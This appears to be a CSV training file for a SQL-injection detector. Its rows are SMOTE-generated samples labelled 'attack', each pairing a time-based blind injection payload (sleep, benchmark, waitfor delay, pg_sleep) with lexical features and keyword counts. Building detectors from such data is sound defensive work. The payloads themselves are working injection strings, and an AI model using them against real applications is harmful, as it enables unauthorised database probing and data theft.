id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000132,attack,time,1%'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000273,0.5630909333719538,95.18263697287324,25.0,3.028254392401119,30.0,2.0,48.9855308107277,14.197106162145541,0.31642282850156844,0.02109485523343789,0.5133946956261919,0.14908762063880174,1.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,10.197106162145541,1.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000133,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,0.25438798599321805,81.67946304872899,20.10684565042367,2.942169385405359,28.0,2.0,41.67946304872899,10.0,0.34284887845563267,0.02448920560397376,0.5102158879205249,0.12244602801986879,0.0,0.10684565042366889,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,8.893154349576331,0.0,0.0,0.0,1.0,0.0,0.10684565042366898,2.7755575615628914e-17,0.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000134,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,0.9167304239387323,79.47167026251091,19.77357296964753,3.0375420531401898,29.160359454471298,1.4622621616079217,37.84904864643169,11.0,0.3648109720695374,0.017992988117598405,0.47772011049269725,0.1394759293201669,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,0.0,8.673617379884035e-19,8.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000135,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,0.07196568682964817,98.58535146918562,23.91637836154491,3.2087698599281334,36.0,1.0,47.50172983073053,14.083621638455089,0.3652990619153856,0.010147196164316266,0.48169659906315526,0.14285714285714285,0.0,3.0,5.551115123125783e-17,0.0,1.0,1.0,8.673617379884035e-19,9.083621638455089,0.0,0.0,0.0,2.0,0.0,1.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000136,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000130,0.20638372149694503,83.48943031135175,27.0,3.6081002380226668,23.0,15.0,33.74119192612647,11.748238385225292,0.2761874460659,0.18012224743428262,0.4030412977958804,0.14064900870393696,0.0,3.0,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,5.748238385225293,1.0,0.0,1.0,1.0,0.0,1.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000137,attack,time,1'  )   where 1645  =  1645 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000307,0.7402764870248645,55.87928388318613,20.939641941593067,3.529478717200025,17.909462912389596,10.0,20.969820970796533,7.0,0.31830218371681634,0.17987409011799316,0.3759118630825952,0.12591186308259522,1.0,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,3.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000138,attack,time,"1%""   )    )     )   and sleep  (  5  )  #",nearest_attack_euclidean,R000372,0.4246143939312623,41.84041839648981,14.840418396489808,2.5175713989455892,7.840418396489808,2.0,24.0,8.0,0.18732533419317854,0.04780439210628361,0.5736527052754034,0.19121756842513446,0.0,1.0,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,5.0,1.0,0.0,0.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8404183964898083,0.15958160351019174,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000139,attack,time,1  )   where 8320  =  8320 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000234,0.08998409077041908,50.862531153401875,24.05750207689346,4.058344981672266,17.34501246136075,12.0,13.46001661514767,8.057502076893458,0.3407961826031402,0.23681526958743923,0.263627054080972,0.15876149372844858,2.0,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,1.0575020768934582,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000140,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,0.06472189197340708,118.1480845379464,26.88641127172619,3.267869975487781,37.65923381517856,10.0,56.54564508690475,13.943205635863093,0.3186669046189629,0.08472197435524693,0.478546456583607,0.11806466444218314,1.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,1.0,8.673617379884035e-19,9.943205635863094,0.0,0.0,0.0,2.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000141,attack,time,1'||  (  select 'npdx' from dual where 9486  =  9486 and sleep  (  5   )    )   ||',nearest_attack_euclidean,R000873,0.7974370496529741,81.0133827511368,28.006691375568398,3.864557315294536,29.5100370633526,10.0,28.5033456877842,13.0,0.3635209977466707,0.12367328072106538,0.35203045659487897,0.160775264937385,4.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,4.0,0.0,0.0,0.0,5.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.9999999999999999,1.0,0.0,1.0,0.7516728438920997,0.7516728438920997,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.503345687784199
SMOTE_000142,attack,time,"1%'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000553,0.755491239932713,82.73233536577337,22.0,2.9854158979805514,13.0,10.0,43.61027947147781,16.122055894295563,0.15953679476907187,0.12272061136082452,0.5224411178859112,0.1953014759841924,4.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,7.122055894295562,2.0,0.0,1.0,2.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000143,attack,time,"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""ubvd""  =  ""ubvd",nearest_attack_euclidean,R000407,0.6185690407155248,96.13404909569479,28.207327878256134,3.766704572131671,26.0,21.207327878256137,36.34137697395092,12.58534424348773,0.27086846176472545,0.22110789968579575,0.37724846111107413,0.13077517743840467,0.0,3.9999999999999996,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,5.5853442434877305,0.0,0.0,1.0,2.0,0.0,1.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.2073278782561347,0.7926721217438653,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000144,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,0.0001887881504074707,70.00065122220623,19.999837194448443,2.9701625873448867,20.999837194448443,2.0,36.00065122220623,11.000162805551557,0.2999954080485458,0.028571190028495883,0.5142897695155699,0.15714363240738838,4.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,6.000162805551558,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.000081402775779,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.000081402775779
SMOTE_000145,attack,time,waitfor delay '0:0:5' and 'gsvt'  =  'gsvt,nearest_attack_euclidean,R000898,0.23355759931550296,42.31144799902859,20.922138000242853,4.028820058076669,23.311447999028587,3.077861999757147,7.922138000242853,8.0,0.5506819420194323,0.07263760869188116,0.1874938985600265,0.18918655072866009,5.077861999757146,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.9221380002428533,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.9221380002428533,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.9221380002428533,0.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000146,attack,time,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,nearest_attack_euclidean,R001121,0.18006810932588319,79.33699122107363,23.0,3.3749330439465846,26.758905898572227,4.0,34.63835884785834,13.939726474643058,0.33724886031101275,0.050480441144149554,0.4364626838933135,0.17580801465152424,6.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.06027352535694286,8.673617379884035e-19,5.879452949286114,0.0,0.0,0.0,0.06027352535694308,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.06027352535694297,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000147,attack,time,"1""  )   where 9656  =  9656 and sleep  (  5  )  --",nearest_attack_euclidean,R001097,0.25594121112679213,48.72162770936514,20.255674458126972,3.4313150722494545,13.0,10.0,18.977302167492113,6.744325541873028,0.2673861510125569,0.2056816546250438,0.3886366907499124,0.13829550361248688,0.0,1.0,2.0,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,2.744325541873029,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000148,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000138,0.27381930348944356,87.92139423783404,27.0,3.518712772274452,23.0,15.0,37.33711539026723,12.584278847566807,0.2618049585006297,0.1707423642395411,0.4243667986730096,0.14308587858681962,3.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,6.584278847566807,1.0,0.0,1.0,1.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000149,attack,time,"1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000386,0.964215916197373,62.18879667404071,19.46853388765988,2.977789541040805,10.999999999999998,10.0,31.18879667404071,10.0,0.17729419467680632,0.16117654061527847,0.5003527240926368,0.16117654061527847,1.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,5.531466112340118,0.468533887659882,0.0,1.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000150,attack,time,select sleep  (  5  )  # yrpn,nearest_attack_euclidean,R001094,0.021810703822817017,29.0,14.0,3.220884299095468,15.0,1.0,10.0,2.999999999999999,0.5172413793103449,0.034482758620689655,0.3448275862068966,0.10344827586206898,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,2.0000000000000004,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000151,attack,time,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",nearest_attack_euclidean,R000154,0.09860687674377627,45.968270749819034,21.06345850036192,4.134828370657894,26.873082999276157,4.0,7.0634585003619215,8.03172925018096,0.5845500037302365,0.08701783429986659,0.15369139892169809,0.17474076304819897,2.0,3.9999999999999996,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.03172925018096051,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.03172925018096073,1.0,1.0,2.7755575615628914e-17,0.0,0.0,0.03172925018096062,0.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000152,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000660,0.04311597591770347,93.34616704280813,24.971152746432654,3.435369994087596,40.0,1.0,40.28847253567345,12.05769450713469,0.428689535922957,0.010717238398073925,0.4314368934055612,0.12915633227340792,3.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,8.05769450713469,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000153,attack,time,"1  )   as rnfb where 2405  =  2405 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000798,0.5061927300887255,98.47684036185372,26.782405765979103,3.719841904296622,26.694434595874615,27.0,35.564811531958206,9.217594234020897,0.2705475192962965,0.27442207636881183,0.36121665593215985,0.09381374840273185,0.2175942340208974,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,5.0,0.0,0.0,1.0,2.0,0.21759423402089756,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000154,attack,time,1' and sleep  (  5  )  #,nearest_attack_euclidean,R001036,1.0790449994395046,23.54023637822472,13.540236378224721,3.059928405250821,8.000000000000002,2.0,10.0,3.540236378224721,0.3399965742286272,0.0849991435571568,0.42499571778578404,0.1500085644284319,0.5402363782247208,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,2.0000000000000004,0.0,0.0,0.0,0.0,0.5402363782247208,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000155,attack,time,"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""utlk"" like ""utlk",nearest_attack_euclidean,R000975,0.5297419759615472,93.76892135035901,21.60443980709157,3.1929662695905137,26.0,10.0,44.37336115745058,13.39556019290843,0.2786695875717524,0.10718061060452015,0.47129265896658457,0.14285714285714285,0.0,3.9999999999999996,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,7.39556019290843,0.0,0.0,1.0,1.0,0.0,1.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000156,attack,time,1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000804,0.15342242968211475,99.20399433789139,23.240798867578278,3.2475974842449453,32.0,10.0,45.96319547031311,11.240798867578278,0.3227137092517808,0.10084803414118151,0.46316756596845376,0.1132706906385839,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,1.0,8.673617379884035e-19,8.240798867578278,0.0,0.0,0.0,2.0,0.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000157,attack,time,1'  )   as ftyp where 5851  =  5851 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R001060,0.2068741747859422,95.44234664173278,28.0,3.7190812277522927,28.819544603876672,18.0,37.81954460387667,10.803257433979445,0.30144597502136017,0.18920021133839254,0.3960460806905564,0.11330773294969088,1.0,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,4.803257433979445,0.0,1.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000158,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000516,0.5211445543561855,83.00664937556397,28.20265975022559,3.82748449923365,31.405319500451178,10.0,28.601329875112796,13.0,0.37729140833642966,0.12077388333244866,0.3449286599989384,0.1570060483321833,4.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,4.0,0.0,0.0,0.0,5.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.9999999999999999,1.0,0.0,1.0,0.8006649375563972,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8006649375563972
SMOTE_000159,attack,time,"1"" where 3740  =  3740 rlike sleep  (  5  )  #",nearest_attack_euclidean,R000778,0.6156003440893912,49.260113591645265,21.889121888630527,3.6259152054019057,16.18549585150737,10.0,17.778243777261057,5.296373962876843,0.32823459393389015,0.20495761406695168,0.35912944175731665,0.1076783502418415,0.0,1.0,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,2.296373962876843,0.0,0.0,0.0,1.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.2963739628768428,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2963739628768427
SMOTE_000160,attack,time,"1%'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000673,0.09990705902287206,115.14741598100487,27.0,3.206625583695076,18.0,21.0,57.317932784803894,18.829483196200975,0.15642050360620627,0.18249058754057398,0.49758702636133456,0.1635018824918852,4.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,9.829483196200975,2.0,0.0,1.0,2.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000161,attack,time,"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'obeh'  =  'obeh",nearest_attack_euclidean,R000473,0.4458451671214977,109.17964830898231,27.27288226364412,3.5476748724405964,26.0,22.0,46.72541283627055,14.454235472711758,0.2389674751020345,0.20220324816325996,0.42647619871721254,0.132353078017493,4.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,7.454235472711758,0.0,0.0,1.0,2.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
